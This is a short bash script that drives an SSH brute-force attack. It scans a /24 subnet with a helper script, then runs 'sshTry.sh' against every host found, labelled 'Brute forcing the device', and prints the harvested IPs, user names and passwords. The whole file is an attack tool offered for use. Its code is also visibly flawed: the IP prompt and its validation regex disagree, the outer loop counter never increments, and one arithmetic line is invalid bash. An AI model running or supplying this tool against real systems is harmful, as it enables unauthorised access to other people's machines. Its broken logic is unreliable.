#!/bin/bash
rm userPassIPFile.txt
if [ $# -le 0 ]
then
	echo "please enter the IP ID in the form of x.x.x"
	echo "this program handles only /24 subnet values"
	exit 0
fi

val=""
echo $1 > temp.txt
val=$(grep -E "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" temp.txt)
ip=$(grep -ohE "([0-9]{1,3}\.){3}" temp.txt)
echo $ip
if [[ $val == "" ]]
then
	echo " enter a valid IP address"
	echo "please enter the IP ID in the form of x.x.x"
        echo "this program handles only /24 subnet values"
	exit
else
	echo "trying with $ip.0/24"
fi

n=1
k=1
while (($n <=5 ))
do
echo ""
echo ""
echo "running the script for the $k th time"
echo ""
echo ""
echo "Scanning the Network"
./nwscan.sh $ip > ips.txt
echo ""
echo ""
echo "Devices on the network"
sleep 2
cat ips.txt

echo ""
echo ""
echo "SSH attempt"
echo ""

while IFS= read -r line; do
	echo "Brute forcing the device with IP $line"
	./sshTry.sh $line
	echo ""
	echo ""
done < ips.txt

echo "Completed!!"
sleep 1
echo "IP , User name , Passwords are"
python command_helper.py
k=(($k + 1))
echo "about to retart in few seconds"
sleep 4
echo ""
echo ""
done
rm temp.txt